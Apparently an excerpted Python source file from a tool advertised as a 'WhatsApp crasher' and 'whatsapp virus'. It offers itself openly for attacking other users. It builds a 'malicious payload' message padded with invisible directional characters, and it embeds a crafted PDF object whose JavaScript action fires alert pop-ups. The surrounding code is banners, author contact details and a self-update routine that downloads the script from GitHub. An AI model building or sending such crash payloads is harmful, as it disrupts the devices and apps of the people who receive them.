...
def aboutus():
    ...
    slow("    Latest Update  ::   22 - OCT - 2025")
    slow("    Github         ::   ATHEX HACKER")
    slow("    Youtube        ::   BLACK HAT ATHEX")
    slow("    Email Address  ::   athexithouse@gmail.com")
    slow(f"==========================================================={white}\n")
...
def set_malicious_payload(user):
    user_payload = f"‎‏\n\tattacker's message: {user}\n\t‎‏\n\tattacke's ip: {ipaddr}\n\twhatsapp crasher, created by @th3x 😈☠😈" if user else ""
    ...
    ======================================================================================
        ‎‏         >> athex  😈☠😈  <<      ‎‏ 
    ‎‏      >> whatsapp virus by athex  <<      ‎‏
    ‎‏ >> https://github.com/Athexhacker/Whatsapp-Crasher << ‎‏ 
    ‎‏ >> Whatsapp-Crasher by athex hacker 😈☠😈 << ‎‏ 
    ======================================================================================
        """,
        "malicious-payload": """
    %PAYLOAD - 1.4
    ...
    /Type /Action
    /S /JavaScript
    /JS (app\056alert\050\042evil\055athex\040whatsapp-warm\042\051\073\012app\056alert\050\042al\055athex\040whatsapp-warm1\042\051\073\012app\056alert\050\042al\055athex\040whatsapp-warm2\042\051\073)
    >>
    endobj
    5 0 obj
    <<
    ...
    >>‎‏    ATHEX HACKER 😈☠😈
    >>‎‏    ATHEX HACKER 😈☠😈
    >>    https://athex-software-house.netlify.app      <<
         G-Mail  athexithouse@gmail.com  
        """
    }
    ...
    ======================================================================================
            ‎‏         >> ATHEX HACKER 😈☠😈  <<      ‎‏ 
        ‎‏      >> whatsapp virus by ATHEX HACKER  <<      ‎‏
        ‎‏ >> https://github.com/Athexhacker/Whatsapp-Crasher << ‎‏ 
        ‎‏ >> Whatsapp-Crasher by ATHEX HACKER 😈☠😈 << ‎‏ 
    ======================================================================================"""
    ...
    ======================================================================================
        ...
        ‎‏      >> whatsapp virus by AtHeX  <<      ‎‏
        ‎‏ >> https://github.com/Athexhacker/Whatsapp-Crasher << ‎‏ 
        ‎‏ >> Whatsapp-Crasher by ëvĩʟ-fɘōɳĭx hacker 😈☠😈 << ‎‏ 
    ======================================================================================"""
...
def updateus(): 
    try:
        script_url = "https://github.com/Athexhacker/Whatsapp-Crasher/raw/main/crasher.py"
...
===========================================================
    ...
    Contact us at athexithouse@gmail.com 

           [+] Subscribe To Our YouTube Channel [+]
==========================================================={white}""")
    input(f"{red}Press [ENTER] to Continue...{white}") 
    Athexhacker="https://github.com/Athexhacker" 
    os.system(f"xdg-open {Athexhacker}")
    print(f"{white}") 
    os.sys.exit()
